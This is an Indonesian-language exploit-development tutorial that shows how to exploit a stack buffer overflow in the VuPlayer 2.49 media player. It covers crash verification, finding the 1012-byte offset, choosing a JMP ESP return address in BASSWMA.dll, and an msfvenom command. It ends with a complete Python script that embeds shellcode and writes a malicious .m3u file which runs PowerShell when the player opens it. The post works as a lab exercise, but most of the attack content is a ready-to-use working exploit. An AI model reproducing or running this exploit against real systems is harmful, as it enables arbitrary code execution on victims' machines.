---
layout: post
title: Eksploitasi Kerawanan Buffer Overflow Pada VuPlayer 2.49
---

## Tahap 1 : Verifikasi Kerawanan
-----
Untuk memverifikasi kerawanan aplikasi cukup dengan mencoba memberikan input yang dapat menyebabkan aplikasi crash. Saya akan menggunakan python untuk membantu membuat file inputan yang akan digunakan untuk memverifikasi kerawanan pada aplikasi. 

```python
file = open("2000A.m3u", "w")
var = 'A'*2000
file.write(var)
file.close()
```

Script python di atas akan membuat sebuah file bertipe *.m3u dan berisi string A sebanyak 2000 karakter. Lalu file hasil output ini akan digunakan sebagai input pada aplikasi VuPlayer.
Aplikasi pun berhasil dibuat crash dengan input ini.

![Crash]({{ site.baseurl }}/images/vuplayer2.49/crash.png)

## Tahap 2 : Mengecek memory/register
-----
Karena kerawanan pada aplikasi ini telah diverifikasi, selanjutnya saya mencoba untuk melihat apa yang terjadi pada memory-nya ketika diberikan input tersebut. Saya coba lakukan debugging dengan menggunakan IDA PRO 6.6 dan berikut merupakan hasil tangkapan memory pada saat diberikan input tersebut.

![2000A]({{ site.baseurl }}/images/vuplayer2.49/2000A.png)

Dapat dilihat bahwa input tersebut berhasil menimpa nilai pada register EIP dan EBP yang berarti return address pada fungsi tersebut juga telah berubah.

## Tahap 3 : Menghitung panjang buffer
-----
Pada tahap 2, saya sudah berhasil mengubah nilai return address dari suatu fungsi pada aplikasi ini namun masih belum tahu pasti berapa panjang buffer-nya. Jika kita mengetahui panjang buffer yang dibutuhkan untuk mencapai return address, maka kita dapat mengubah alur program sesuai dengan kemauan kita. Untuk dapat mengetahui itu, terdapat dua cara yang saya lakukan, yaitu dengan membuat file input mengandung string yang unik dan panjang atau dengan menghitung alamat dari karakter pertama hingga menemui return address.

### 1. Dengan membuat string unik

Cara ini merupakan cara yang lebih mudah dibandingkan dengan cara kedua. Prinsip dari cara ini adalah dengan membuat serangkaian string yang unik, kemudian nilai yang akan tersimpan di return address dilihat berada pada offset berapa sehingga dapat mengetahui berapa panjang buffer hingga mencapai return address. Di sini saya akan menggunakan online tools untuk menggenerate string uniknya serta untuk menghitung offsetnya, yaitu [Overflow Exploit Pattern Generator](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html).

![Generator1]({{ site.baseurl }}/images/vuplayer2.49/generator1.png)

Saya menggenerate sebuah string unik berjumlah 2000 karakter. Kemudian copy-paste string ini ke dalam script python untuk membuat sebuah file bertipe *.m3u. File ini nanti akan saya jadikan sebagai input dari aplikasi VuPlayer.

```python
file = open("2000Unik.m3u", "w")
var = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
file.write(var)
file.close()
```

Setelah itu, coba lagi debugging menggunakan IDA PRO 6.6 dan melihat isi memory ketika input diberikan. Memory tersebut tampak seperti gambar di bawah ini:

![Generator2]({{ site.baseurl }}/images/vuplayer2.49/generator2.png)

Dapat dilihat bahwa pada return address-nya tertimpa dengan nilai hexa 0x68423768 yang mana merupakan representasi dari string "h7Bh". Untuk mengetahui offset-nya cukup dengan memasukkan string tersebut ke online tools yang tadi digunakan. Maka akan memberikan output 1012 yang berarti panjang buffer untuk mencapai return address adalah sepanjang 1012 karakter.

![Generator3]({{ site.baseurl }}/images/vuplayer2.49/generator3.png)

### 2. Dengan mencarinya secara manual

Pertama-tama yang harus dilakukan adalah memperkecil kemungkinan buffer-nya. Hal ini dapat dilakukan dengan cara mengurani jumlah karakter pada file inputan yang diberikan pada aplikasi atau pun menambahkan hal lainnya. Di sini saya akan menambakan huruf B pada file inputan. 

```python
file = open("1000AB.m3u", "w")
var = 'A'*1000 + 'B'*1000
file.write(var)
file.close()
```

Lalu seperti biasa, jadikan file output dari script python di atas sebagai input pada aplikasi VuPlayer. Hasilnya dapat dilihat seperti gambar di bawah ini:

![manual1]({{ site.baseurl }}/images/vuplayer2.49/manual1.png)

Dapat dilihat bahwa return address berubah menjadi 0x42424242 yang menunjukkan bahwa kemungkinan rentang panjang buffer berada di atas 1000 karakter (karena huruf A berjumlah 1000) dan di bawah 1016 karakter (karena berada berada di sebelum ESP). Sehingga selanjutnya hanya perlu membuat 16 karakter terakhir menjadi unik menemukan alamat dari return address serta offset-nya.

## Tahap 4 : Mencari JMP ESP
-----
Pada kasus ini, kita tidak dapat meletakkan sebuah alamat dari stack langsung ke return address karena alamat stack dimulai dengan 0x00 (null karakter) yang menyebabkan sisa-sisa setelah karakter tersebut tidak dapat dimuat. Oleh karena itu kita harus melompat ke bagian stack yang mengandung payload yang kita buat menggunakan metode yang tidak langsung. Kita perlu menemukan sebuah alamat yang mengandung instruksi "jmp esp" dan menimpa alamat return address dengan alamatnya. Untuk menemukannya, saya menggunakan Immunity Debugger 1.85. Pada Immunity Debugger jalankan perintah  `!searchcode jmp esp` , lalu semua instruksi yang mengandung "jmp esp" akan terlihat termasuk alamatnya. Kita juga perlu yang memiliki akses eksekusi, baca, dan tulis.

![ImmunityDbg]({{ site.baseurl }}/images/vuplayer2.49/basswma.png)

Dapat dilihat bahwa BASSWMA.dll memiliki instruksi "jmp esp" serta akses untuk eksekusi, baca, dan tulis. Oleh karena itu, saya akan menggunakan ini untuk dapat menjalankan payload. BASSWMA.dll ini terletak di alamat 0x1010539F. Dengan alamat inilah nantinya akan kita timpan alamat return address yang ada pada stack.

## Tahap 5 : Membuat exploit
-----
Dari tahap-tahap sebelumnya, beberapa hal penting sudah ditemukan, antara lain: 
1. Panjang buffer yang diperlukan untuk mencapai return address
2. Alamat dari BASSWMA.dll sebagai tujuan return address

Dari hal-hal tersebut, sudah bisa dibuat sebuah kerangka exploit. Exploit ini ditulis menggunakan python2 dan bukannya python3. Hal ini karena pada python2 lebih mudah untuk menggabungkan (concatenation) nilai-nilai bytes dibandingkan dengan python3. Berikut ini adalah kerangka exploit yang akan kita gunakan:

```python
import struct

junk = "\x41" * 1012
address = struct.pack("I", 0x1010539f)
nops = "\x90" * 16

shellcode = (
	""
    )

buffer = junk + address + nops + shellcode

file = open("exploit.m3u", "w")
file.write(buffer)
file.close()

print "Payload berhasil dibuat..."
```

Script python tersebut akan menuliskan sebuah string dengan karakter A sebanyak 1012 karakter, kemudian dilanjutkan dengan alamat dari BASSWMA.dll (0x1010539f) yang akan menimpa return address pada stack. Kemudian ditambahkan lagi dengan bytes "0\x90" dan yang terakhir dilanjutkan lagi dengan shellcode yang akan kita buat. Namun dalam kerangka exploit ini shellcode-nya masih belum dibuat. Cara termudah untuk membuat shellcode adalah dengan menggunakan msfvenom. Berikut perintah yang saya gunakan untuk menggenerate shellcode-nya:

```bash
msfvenom -a x86 --platform windows -p windows/exec CMD='powershell' -b '\x00\x09\x0a\x0d\x1a\x20' --format python
```

Perintah di atas akan menghasilkan shellcode yang dapat digunakan.

![msfvenom1]({{ site.baseurl }}/images/vuplayer2.49/venom1.png)

Kemudian shellcode yang sudah digenerate tadi dimasukkan ke script python exploit yang tadi sudah dibuat, sehingga exploit yang sudah jadi seperti ini:

```python
import struct

junk = "\x41" * 1012
address = struct.pack("I", 0x1010539f)
nops = "\x90" * 16

shellcode = (
	"\xbe\xab\xfa\x6f\xc3\xdb\xda\xd9\x74\x24\xf4\x5f\x29"
    "\xc9\xb1\x31\x83\xc7\x04\x31\x77\x11\x03\x77\x11\xe2"
    "\x5e\x06\x87\x41\xa0\xf7\x58\x26\x29\x12\x69\x66\x4d"
    "\x56\xda\x56\x06\x3a\xd7\x1d\x4a\xaf\x6c\x53\x42\xc0"
    "\xc5\xde\xb4\xef\xd6\x73\x84\x6e\x55\x8e\xd8\x50\x64"
    "\x41\x2d\x90\xa1\xbc\xdf\xc0\x7a\xca\x4d\xf5\x0f\x86"
    "\x4d\x7e\x43\x06\xd5\x63\x14\x29\xf4\x35\x2e\x70\xd6"
    "\xb4\xe3\x08\x5f\xaf\xe0\x35\x16\x44\xd2\xc2\xa9\x8c"
    "\x2a\x2a\x05\xf1\x82\xd9\x54\x35\x24\x02\x23\x4f\x56"
    "\xbf\x33\x94\x24\x1b\xb6\x0f\x8e\xe8\x60\xf4\x2e\x3c"
    "\xf6\x7f\x3c\x89\x7d\x27\x21\x0c\x52\x53\x5d\x85\x55"
    "\xb4\xd7\xdd\x71\x10\xb3\x86\x18\x01\x19\x68\x25\x51"
    "\xc2\xd5\x83\x19\xef\x02\xbe\x43\x7a\xd4\x4d\xfe\xc8"
    "\xd6\x4d\x01\x7d\xbf\x7c\x8a\x12\xb8\x81\x59\x57\x36"
    "\xc8\xc0\xfe\xdf\x94\x90\x42\x82\x27\x4f\x80\xbb\xab"
    "\x7a\x79\x38\xb3\x0e\x7c\x04\x74\xe2\x0c\x15\x10\x04"
    "\xa2\x16\x31\x74\x2b\x9e\xdc\x07\xc0\x08\x7b\x84\x4a"
    "\xc9"
    )

buffer = junk + address + nops + shellcode

file = open("exploit.m3u", "w")
file.write(buffer)
file.close()

print "Payload berhasil dibuat..."
```

Lalu jalankan script python tersebut untuk menghasilkan file exploit *.m3u yang akan dijadikan input pada aplikasi VuPlayer.

![m3u]({{ site.baseurl }}/images/vuplayer2.49/m3u.png)

## Tahap 6 : Eksekusi
-----

Pindahkan exploit yang tadi sudah dibuat ke machine yang akan digunakan untuk menjalankan VuPlayer (dalam hal ini virtualbox). Setelah itu jalankan VuPlayer dan gunakan exploit tadi sebagai input pada aplikasinya.

![SUCCESS]({{ site.baseurl }}/images/vuplayer2.49/success.png)

Hasilnya program VuPlayer crash dan membuka powershell pada windows. Eksploitasi kerawanan pada aplikasi VuPlayer 2.49 berhasil dilakukan.